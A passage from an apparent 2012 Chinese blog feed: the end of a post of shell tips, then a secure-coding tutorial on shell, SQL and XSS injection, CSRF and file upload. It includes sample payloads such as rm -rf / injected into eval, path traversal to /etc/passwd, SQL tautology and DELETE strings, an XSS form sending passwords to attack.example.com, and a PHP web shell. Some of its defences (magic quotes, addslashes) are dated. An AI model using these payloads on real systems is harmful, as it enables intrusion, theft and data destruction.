<li>每个月<a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html" target="_blank" rel="noopener">tiobe</a>上都会给一个编程语言的排名，来显示各种语言的流行度。排名指数综合了全球范围内使用该语言的工程师人数、教学的课程数和第三方供应商数。截止至2012年11月份，tiobe公布的编程语言排行榜里，bash的指数是0.56%排名22位。如果算上它旗下的awk 0.21%和tcl 0.146%，大概就能排到14名。注意这里还不包括bash的同源的兄弟姐妹csh、ksh等，算上它们，shell家族有望接近前十。值得一提的是一直以来shell的排名就很稳定，不像某些“暴发户”语言，比如objective-c，这些语言的流行完全是因为当前Apple系的崛起，但这种热潮极有可能来得快去得更快。</li>
</ul>
<p><span id="more-8619"></span></p>
<p><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p> </p>
<p>全球最大的源代码仓库Github里，shell相关的项目数占到了8%，跻身前5和Java相当，可见在实战工程里，shell可谓宝刀不老。图片来源，<a href="https://github.com/languages">参见这里</a></p>
<p><img alt="image placeholder" ></p>
<h4>一些强大的命令</h4>
<p>再分享一些可能你不知道的shell用法和脚本，简单&amp;强大！</p>
<p><em>在阅读以下部分前，强烈建议读者打开一个shell实验，这些都不是shell教科书里的大路货哦：）</em></p>
<ul>
<li>
<strong><code>!$</code></strong><br>
<code>!$</code>是一个特殊的环境变量，它代表了上一个命令的最后一个字符串。如：你可能会这样：
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$mkdir mydir
$mv mydir yourdir
$cd yourdir</pre>
<p>可以改成：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$mkdir mydir
$mv !$ yourdir
$cd !$</pre>
</li>
</ul>
<ul>
<li>
<strong><code>sudo !!</code></strong><br>
以root的身份执行上一条命令 。<br>
场景举例：比如Ubuntu里用<code>apt-get</code>安装软件包的时候是需要root身份的，我们经常会忘记在<code>apt-get</code>前加<code>sudo</code>。每次不得不加上<code>sudo</code>再重新键入这行命令，这时可以很方便的用<code>sudo !!</code>完事。<br>
（陈皓注：在shell下，有时候你会输入很长的命令，你可以使用!xxx来重复最近的一次命令，比如，你以前输入过，vi /where/the/file/is, 下次你可以使用 !vi 重得上次最近一次的vi命令。）</li>
</ul>
<ul>
<li>
<strong><code>cd –</code></strong><br>
回到上一次的目录 。<br>
场景举例：当前目录为<code>/home/a</code>，用<code>cd ../b</code>切换到<code>/home/b</code>。这时可以通过反复执行<code>cd –</code>命令在<code>/home/a</code>和<code>/home/b</code>之间来回方便的切换。<br>
（陈皓注：cd ~ 是回到自己的Home目录，cd ~user，是进入某个用户的Home目录）</li>
</ul>
<ul>
<li>
<strong><code>'ALT+.' or '&lt;ESC&gt; .'</code></strong><br>
热建alt+. 或 esc+. 可以把上次命令行的参数给重复出来。</li>
</ul>
<ul>
<li>
<strong><code>^old^new</code></strong><br>
替换前一条命令里的部分字符串。<br>
场景：<code>echo "wanderful"</code>，其实是想输出<code>echo "wonderful"</code>。只需要<code>^a^o</code>就行了，对很长的命令的错误拼写有很大的帮助。（陈皓注：也可以使用 <strong>!!:gs/old/new</strong>）</li>
</ul>
<ul>
<li>
<strong><code>du -s * | sort -n | tail</code></strong><br>
列出当前目录里最大的10个文件。</li>
</ul>
<ul>
<li>
<strong><code>:w !sudo tee %</code></strong><br>
在vi中保存一个只有root可以写的文件</li>
</ul>
<ul>
<li>
<strong><code>date <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cee3aa8efffcfdfafbf8f9f6f7fe">[email protected]</a></code></strong><br>
时间截转时间</li>
</ul>
<ul>
<li>
<div title="Click to select this command">
<div>
<strong><code>&gt; file.txt</code></strong><br>
创建一个空文件，比touch短。</div>
</div>
</li>
</ul>
<ul>
<li>
<strong><code>mtr coolshell.cn</code></strong><br>
mtr命令比traceroute要好。</li>
</ul>
<ul>
<li>在命令行前加空格，该命令不会进入history里。</li>
</ul>
<ul>
<li>
<strong><code>echo "ls -l" | at midnight</code></strong><br>
在某个时间运行某个命令。</li>
</ul>
<ul>
<li>
<strong><code>curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml</code></strong><br>
命令行的方式更新twitter。</li>
</ul>
<ul>
<li>
<strong><code>curl -u username --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /&lt;name&gt;/; print "$2\n" if /&lt;(title|name)&gt;(.*)&lt;\/\1&gt;/;'</code></strong><br>
检查你的gmail未读邮件</li>
</ul>
<ul>
<li>
<strong><code>ps aux | sort -nk +4 | tail</code></strong><br>
列出头十个最耗内存的进程</li>
</ul>
<ul>
<li>
<strong><code>man ascii</code></strong><br>
显示ascii码表。<br>
场景：忘记ascii码表的时候还需要google么?尤其在天朝网络如此“顺畅”的情况下，就更麻烦在GWF多应用一次规则了，直接用本地的<code>man ascii</code>吧。</li>
</ul>
<ul>
<li>
<strong><code>ctrl-x e</code></strong><br>
快速启动你的默认编辑器（由变量$EDITOR设置）。</li>
</ul>
<ul>
<li>
<strong><code>netstat –tlnp</code></strong><br>
列出本机进程监听的端口号。（陈皓注：netstat -anop 可以显示侦听在这个端口号的进程）</li>
</ul>
<ul>
<li>
<strong><code>tail -f /path/to/file.log | sed '/^Finished: SUCCESS$/ q'</code></strong><br>
当file.log里出现Finished: SUCCESS时候就退出tail，这个命令用于实时监控并过滤log是否出现了某条记录。</li>
</ul>
<ul>
<li>
<strong><code>ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fb8e889e89bb889e898d9e89">[email protected]</a> bash &lt; /path/to/local/script.sh</code></strong><br>
在远程机器上运行一段脚本。这条命令最大的好处就是不用把脚本拷到远程机器上。</li>
</ul>
<ul>
<li>
<strong><code>ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="493c3a2c3b0921263a3d">[email protected]</a> cat /path/to/remotefile | diff /path/to/localfile -</code></strong><br>
比较一个远程文件和一个本地文件</li>
</ul>
<ul>
<li>
<div title="Click to select this command">
<div>
<strong><code>net rpc shutdown -I ipAddressOfWindowsPC -U username%password</code></strong><br>
远程关闭一台Windows的机器</div>
</div>
</li>
</ul>
<ul>
<li>
<strong><code>screen -d -m -S some_name ping my_router</code></strong><br>
后台运行一段不终止的程序，并可以随时查看它的状态。<code>-d -m</code>参数启动“分离”模式，<code>-S</code>指定了一个session的标识。可以通过<code>-R</code>命令来重新“挂载”一个标识的session。更多细节请参考screen用法 <code>man screen</code>。</li>
</ul>
<ul>
<li>
<strong><code>wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com</code></strong><br>
下载整个www.example.com网站。（注：别太过分，大部分网站都有防爬功能了：））</li>
</ul>
<ul>
<li>
<strong><code>curl ifconfig.me</code></strong><br>
当你的机器在内网的时候，可以通过这个命令查看外网的IP。</li>
</ul>
<ul>
<li>
<strong><code>convert input.png -gravity NorthWest -background transparent -extent 720x200  output.png</code></strong><br>
改一下图片的大小尺寸</li>
</ul>
<ul>
<li>
<strong><code>lsof –i</code></strong><br>
实时查看本机网络服务的活动状态。</li>
</ul>
<ul>
<li>
<strong><code>vim scp://<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="681d1b0d1a0609050d2800071b1c">[email protected]</a>//path/to/somefile</code></strong><br>
vim一个远程文件</li>
</ul>
<ul>
<li>
<strong><code>python -m SimpleHTTPServer</code></strong><br>
一句话实现一个HTTP服务，把当前目录设为HTTP服务目录，可以通过<code>http://localhost:8000</code>访问 这也许是这个星球上最简单的HTTP服务器的实现了。</li>
</ul>
<ul>
<li>
<strong><code>history | awk '{CMD[$2]++;count++;} END { for (a in CMD )print CMD[a] " " CMD[a]/count*100 "% " a }' | grep -v "./" | column -c3 -s " " -t | sort -nr | nl | head -n10</code></strong><br>
(陈皓注：有点复杂了，history|awk ‘{print $2}’|awk ‘BEGIN {FS=”|”} {print $1}’|sort|uniq -c|sort -rn|head -10)<br>
这行脚本能输出你最常用的十条命令，由此甚至可以洞察你是一个什么类型的程序员。</li>
</ul>
<ul>
<li>
<div title="Click to select this command">
<div>
<strong><code>tr -c "[:digit:]" " " &lt; /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"</code></strong><br>
想看看Marix的屏幕效果吗？（不是很像，但也很Cool!）</div>
</div>
</li>
</ul>
<p>看不懂行代码？没关系，系统的学习一下*nix shell脚本吧，力荐<a href="http://www.ituring.com.cn/book/980">《Linux命令行与Shell脚本编程大全》</a>。</p>
<h4>参考文献：</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Unix_shell#Shell_categories">Unix Shell Wiki</a></li>
<li><a href="https://github.com">Github language ranking</a></li>
<li><a href="http://www.softpanorama.org/People/Shell_giants/introduction.shtml">An introduction of Unix Shell history</a></li>
<li><a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html" target="_blank" rel="noopener">Tiobe Software</a></li>
<li><a href="https://www.commandlinefu.com/" target="_blank" rel="noopener">http://www.commandlinefu.com/</a></li>
</ul>
<p></p>
 ]]></content>
<pubDate>2012-11-23T08:19:24+08:00</pubDate>
<guid>https://coolshell.cn/articles/8619.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员疫苗：代码注入 ]]></title>
<link>https://coolshell.cn/articles/8711.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >几个月在<a href="https://weibo.com/haeol" target="_blank">我的微博</a>上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。</p>
<p>我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质的文章，也算是热热身。希望大家喜欢，先向大家介绍第一注疫苗——代码注入。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Shell%E6%B3%A8%E5%85%A5" title="Shell注入">Shell注入</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#SQL%E6%B3%A8%E5%85%A5" title="SQL注入">SQL注入</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8_%E5%85%A5" title="跨网站脚本注 入">跨网站脚本注 入</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6" title="上传文件">上传文件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#URL%E8%B7%B3%E8%BD%AC" title="URL跳转">URL跳转</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Shell%E6%B3%A8%E5%85%A5"></span>Shell注入<span class="ez-toc-section-end"></span>
</h4>
<p>我们先来看一段perl的代码：</p>
<p>[perl]use CGI qw(:standard);<br>
$name = param(‘name’);<br>
$nslookup = "/path/to/nslookup";<br>
print header;<br>
if (open($fh, "$nslookup $name|")) {<br>
  while (&lt;$fh&gt;) {<br>
print escapeHTML($_);<br>
print "&lt;br&gt;\n";<br>
}<br>
close($fh);<br>
}[/perl]</p>
<p>如果用户输入的参数是：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">coolshell.cn%20%3B%20/bin/ls%20-l</code></p>
<p>那么，这段perl的程序就成了：</p>
<p><span id="more-8711"></span></p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">/path/to/nslookup coolshell.cn ; /bin/ls -l</code></p>
<p>我们再来看一段PHP的程序：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$myvar = 'somevalue';
$x = $_GET['arg'];
eval('$myvar = ' . $x . ';');</pre>
<p>“<code>eval</code>“的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果”arg”如果被设成”<code>10; system('rm -rf /')</code>“，后面的”<code>system('rm -rf /')</code>“代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“<a title="一个空格引发的惨剧" href="https://coolshell.cn/articles/4875.html" target="_blank">一个空格引发的悲剧</a>”）</p>
<p>再来看一个PHP的代码</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$isadmin= false;
...
...
foreach ($_GET as $key =&gt; $value) {
  $$key = $value;
}</pre>
<p>如果攻击者在查询字符串中给定”isadmin=1″，那$isadmin将会被设为值 “1”，然后攻击值就取得了网站应用的admin权限了。</p>
<p>再来看一个PHP的示例：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$action = 'login';
   if (__isset( $_GET['act'] ) )
      $action = $_GET['act'];
   require( $action . '.php' ); </pre>
<p>这个代码相当危险，攻击者有可能可以干这些事：</p>
<ul>
<li>
<code>/test.php?act=<strong>http://evil/exploit</strong></code> – 注入远程机器上有漏洞的文件。</li>
<li>
<code>/test.php?act=<strong>/home/www/bbs/upload/exploit</strong></code> – 从一个已经上载、叫做exploit.php文件运行其代码。</li>
<li>
<code>/test.php?act=<strong>../../../../etc/passwd%00</strong></code> – 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除<code>.php</code>扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值”magic_quotes_gpc = On”可以终止这种攻击)</li>
</ul>
<p>这样的示例有很多，只要你的程序有诸如：<code>system()</code>、<code>StartProcess()</code>、<code>java.lang.Runtime.exec()</code>、<code>System.Diagnostics.Process.Start()</code>以及类似的应用程序接口，都是比较危险的，最好不要让其中的字符串去拼装用户的输入。</p>
<p>PHP提供<code><a href="http://www.php.net/manual/en/function.escapeshellarg.php" rel="nofollow">escapeshellarg()</a></code>和<code><a href="http://www.php.net/manual/en/function.escapeshellcmd.php" rel="nofollow">escapeshellcmd()</a></code>以在调用方法以前进行编码。然而，实际上并不建议相信这些方法是安全的 。</p>
<h4>
<span class="ez-toc-section" id="SQL%E6%B3%A8%E5%85%A5"></span>SQL注入<span class="ez-toc-section-end"></span>
</h4>
<p>SQL injection，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏。</p>
<p>在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：</p>
<ol>
<li>在应用程序中使用字符串联结方式组合SQL指令（如：引号没有转义）。</li>
<li>在应用程序链接数据库时使用权限过大的帐户（如：很多开发人员都喜欢用sa（最高权限的系统管理员帐户）连接Microsoft SQL Server数据库）。</li>
<li>在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）</li>
<li>过于信任用户所输入的数据，未限制输入的字符数，以及未对用户输入的数据做潜在指令的检查。</li>
</ol>
<p>例程：</p>
<p>某个网站的登录验证的SQL查询代码为</p>
<div dir="ltr">
<div>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = "SELECT * FROM users
WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"</pre>
</div>
</div>
<p>用户在登录时恶意输入如下的的用户名和口令：</p>
<div dir="ltr">
<div>
<code data-enlighter-language="sql" class="EnlighterJSRAW">userName = "' OR '1'='1";</code>
</div>
</div>
<div dir="ltr">
<div>
<code data-enlighter-language="sql" class="EnlighterJSRAW">passWord = "' OR '1'='1";</code>
</div>
</div>
<p>此时，将导致原本的SQL字符串被解析为：</p>
<div dir="ltr">
<div>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = "SELECT * FROM users
WHERE (name = '' OR '1'='1') and (pw = '' OR '1'='1');"</pre>
</div>
</div>
<p>也就是实际上运行的SQL命令会变成下面这样的，因此导致无帐号密码，也可登录网站。</p>
<div dir="ltr">
<div>
<code data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = "SELECT * FROM users;"</code>
</div>
</div>
<p>这还不算恶劣的，真正恶劣的是在你的语句后再加一个自己的语句，如：</p>
<p><code data-enlighter-language="sql" class="EnlighterJSRAW">username= "' ; DELETE FROM users; --";</code></p>
<p>这样一来，要么整个数据库的表被人盗走，要么被数据库被删除。</p>
<p><strong>所以SQL注入攻击被俗称为黑客的填空游戏</strong>。你是否还记得酷壳<a title="千万别惹程序员" href="https://coolshell.cn/articles/6639.html" target="_blank">这篇文章里的SQL注入</a>？</p>
<p><img alt="image placeholder" ></p>
<p>当他们发现一个网站有SQL注入的时候，他们一般会干下面的事：</p>
<ul>
<li>盗取数据表中的数据，例如个人机密数据（信用卡，身份证，手机号，通讯录……），帐户数据，密码等，获得用户的数据和信息后对这些用户进行“社会工程学”活动（如：<a title="为什么不能用微信或米聊这类的软件" href="https://coolshell.cn/articles/8638.html" target="_blank">我前两天在微信上亲身经历</a>）。</li>
</ul>
<ul>
<li>取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。</li>
</ul>
<ul>
<li>在数据库中的数据中插入一些HTML/JS代码，有可能得以在网页加入恶意链接以及XSS，这样一来就让访问者被黑。</li>
</ul>
<ul>
<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。</li>
</ul>
<div>现在的黑客比较坏，瘫痪系统的事，他们干的越来越少，因为没什么利益，他们希望通过获取用户的帐号信息后，转而攻击用户别的帐号，如游戏帐号，网银帐号，QQ帐号等等他们可以获利的事情（这就是为什么我希望大家<a title="如何管理并设计你的口令" href="https://coolshell.cn/articles/2428.html" target="_blank">在不站点上使用不同的口令</a>，甚至不同的用户信息的原因）</div>
<p><strong>如何避免</strong></p>
<ul>
<li>在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。<strong>如果可能应该过滤以下字符：分号“;”，两个减号“–”，单引号“’”，注释“/* … */”</strong>。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）</li>
</ul>
<ul>
<li>更换危险字符。例如在PHP通过<code>addslashes()</code>函数保护SQL注入。</li>
</ul>
<ul>
<li>限制用户输入的长度，限制用户输入的取值范围。</li>
</ul>
<ul>
<li>为当前应用建立权限比较小的数据库用户，这样不会导致数据库管理员丢失。</li>
</ul>
<ul>
<li>把数据库操作封装成一个Service，对于敏感数据，对于每个客户端的IP，在一定时间内每次只返回一条记录。这样可以避免被拖库。</li>
</ul>
<h4></h4>
<h4>
<span class="ez-toc-section" id="%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8_%E5%85%A5"></span>跨网站脚本注 入<span class="ez-toc-section-end"></span>
</h4>
<p><strong>跨网站脚本</strong>（<strong>Cross-site</strong> scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
<p>假如我们有这样一段PHP的代码：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$username = $_GET['username'];
echo '&lt;div&gt; Welcome, ' . $username . '&lt;/div&gt;';</pre>
<p>那么我们可以这样来注入：</p>
<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;Script Language=”Javascript”&gt;alert(“You’ve been attacked!”);&lt;/Script&gt;</div>
<p>甚至这样：</p>
<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;div id=”stealPassword”&gt;Please Login:&lt;form name=”input” action=”http://attack.example.com/stealPassword.php” method=”post”&gt;Username: &lt;input type=”text” name=”username” /&gt;&lt;br/&gt;Password: &lt;input type=”password” name=”password” /&gt;&lt;input type=”submit” value=”Login” /&gt;&lt;/form&gt;&lt;/div&gt;</div>
<p>这会让网页显示以下内容：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;div class="header"&gt; Welcome,
    &lt;div id="stealPassword"&gt;Please Login:
        &lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;
            Username: &lt;input type="text" name="username" /&gt;
            &lt;br/&gt;
            Password: &lt;input type="password" name="password" /&gt;
            &lt;input type="submit" value="Login" /&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/div&gt;
</pre>
<p>注入的代码还有可能变种为如下这种更为隐蔽的方式(unicode码)：</p>
<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">
<div>trustedSite.example.com/welcome.php?username=&lt;script+type=”text/javascript”&gt;</div>
<div>document.write(‘\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073</div>
<div>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064</div>
<div>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067</div>
<div>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D</div>
<div>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063</div>
<div>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F</div>
<div>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D</div>
<div>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061</div>
<div>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068</div>
<div>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070</div>
<div>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D</div>
<div>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079</div>
<div>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061</div>
<div>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065</div>
<div>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073</div>
<div>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075</div>
<div>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073</div>
<div>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022</div>
<div>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E</div>
<div>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D</div>
<div>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C</div>
<div>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F</div>
<div>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D’);&lt;/script&gt;</div>
</div>
<p><strong>XSS的攻击主要是通过一段JS程序得用用户已登录的cookie去模拟用户的操作（甚至偷用户的cookie）</strong>。这个方式可以让用户在自己不知情的情况下操作了自己不期望的操作。如果是网站的管理员中招，还有可能导致后台管理权限被盗。关于其中的一些细节可以参看《<a title="新浪微博的XSS攻击" href="https://coolshell.cn/articles/4914.html" target="_blank">新浪微博的XSS攻击</a>》一文。XSS攻击是程序员有一糊涂就很容易犯的错误，你还可以看看网上的《<a href="https://www.cnblogs.com/kingthy/archive/2011/08/20/2147355.html" target="_blank">腾讯微博的XSS攻击</a>》。</p>
<p>XSS攻击在论坛的用户签档里面（使用img标签）也发生过很多次，包括像一些使用bcode的网站，很有可能会被注入一些可以被浏览器用来执行的代码。包括CSS都有可能被注入javascript代码。</p>
<p>不要以为XSS攻击是我们的程序没有写好，有时候，我们会引用别人站点上的js文件，比如：放一个天气预报的小Widget的js，或是一个流量监控，或是一段广告的js文件。你不知道这些东西是不是有问题，如果有恶意的话，这就是你自己主动注入攻击代码了。</p>
<p><strong>另外，XSS攻击有一部分是和浏览器有关的。</strong>比如，如下的一些例子，你可能从来都没有想过吧？（<strong>更多的例子可以参看酷壳很早以前的这篇文章《<a href="https://coolshell.cn/articles/2416.html" target="_blank">浏览器HTML安全列表</a>》</strong>）</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;table background=”javascript:alert(1)”&gt;

&lt;meta charset=”mac-farsi”&gt;¼script¾alert(1)¼/script¾

&lt;img src=”javascript:alert(1)”&gt;</pre>
<p>XSS攻击通常会引发CSRF攻击。CSRF攻击主要是通过在A站上设置B站点上的链接，通过使用用户在B站点上的登录且还没有过期的cookie，从而使得用户的B站点被攻击。（这得益于现在的多Tab页的浏览器，大家都会同时打开并登录很多的网站，而这些不同网站的页面间的cookie又是共享的）</p>
<p>于是，如果我在A站点内的某个贴子内注入这么一段代码：</p>
<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;img src="http://bank.example.com/transfer?account=XXX&amp;amount=1000000&amp;for=haoel"&gt;</code></p>
<p>很有可能你就在访问A站的这个贴子时，你的网银可能向我转了一些钱。</p>
<p><strong>如何避免</strong></p>
<p>要防止XSS攻击，一般来说有下面几种手段：</p>
<ul>
<li>严格限制用户的输入。最好不要让用户输入带标签的内容。最好不要让用户使用一些所见即所得的HTML编辑器。</li>
</ul>
<ul>
<li>严格过滤用户的输入。如：
<ul>
<li>PHP的<code>htmlentities()或是htmlspecialchars()或是strip_tags()</code>。</li>
<li>Python的<code>cgi.escape()</code>
</li>
<li>ASP的<code>Server.HTMLEncode()</code>。</li>
<li>Node.js的node-validator。</li>
<li>Java的<a href="https://code.google.com/p/xssprotect/" rel="nofollow">xssprotect</a>。</li>
</ul>
</li>
</ul>
<ul>
<li>在一些关键功能，完全不能信任cookie，必需要用户输入口令。如：修改口令，支付，修改电子邮件，查看用户的敏感信息等等。</li>
</ul>
<ul>
<li>限制cookie的过期时间。</li>
</ul>
<ul>
<li>对于CSRF攻击，一是需要检查http的reference header。二是不要使用GET方法来改变数据，三是对于要提交的表单，后台动态生成一个随机的token，这个token是攻击者很难伪造的。（对于token的生成，建议找一些成熟的lib库）</li>
</ul>
<p>另外，你可能觉得网站在处理用户的表单提交就行了，其实不是，<strong>想一想那些Web Mail，我可以通过别的服务器向被攻击用户发送有JS代码、图片、Flash的邮件到你的邮箱，你打开一看，你就中招了</strong>。所以，WebMail一般都禁止显示图片和附件，这些都很危险，只有你完全了解来源的情况下才能打开。<strong>电子邮件的SMTP协议太差了，基本上无法校验其它邮件服务器的可信度，我甚至可以自己建一个本机的邮件服务器，想用谁的邮件地址发信就用谁的邮件地址发信</strong>。<span style="color: #cc0000;"><strong>所以，我再次真诚地告诉大家，请用gmail邮箱</strong></span>。别再跟我说什么QQMail之类的好用了。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"></span>上传文件<span class="ez-toc-section-end"></span>
</h4>
<p>上传文件是一个很危险的功能，尤其是你如果不校验上传文件的类型的话，你可能会中很多很多的招，这种攻击相当狠。<strong>试想，如果用户上传给你一个PHP、ASP、JSP的文件，当有人访问这个文件时，你的服务器会解释执行之，这就相当于他可以在你的服务器上执行一段程序。这无疑是相当危险的。</strong></p>
<p>举个例子：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;form action="upload_picture.php" method="post" enctype="multipart/form-data"&gt;
要上传的文件:
&lt;input type="file" name="filename"/&gt;
&lt;br/&gt;
&lt;input type="submit" name="submit" value="Submit"/&gt;
&lt;/form&gt;
</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$target = "pictures/" . basename($_FILES['uploadedfile']['name']);
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)){
    echo "图片文件上传成功";
}else{&lt;/div&gt;
    echo "图片文件上传失败";
}</pre>
<p>假如我上传了一个PHP文件如下：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">&lt;?php
system($_GET['cmd']);
?&gt;</pre>
<p>那么，我就可以通过如下的URL访问攻击你的网站了：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</code></p>
<p>抵御这样的攻击有两种手段：</p>
<p>1）限制上传文件的文件扩展名。</p>
<p>2）千万不要使用root或Administrator来运行你的Web应用。</p>
<h4>
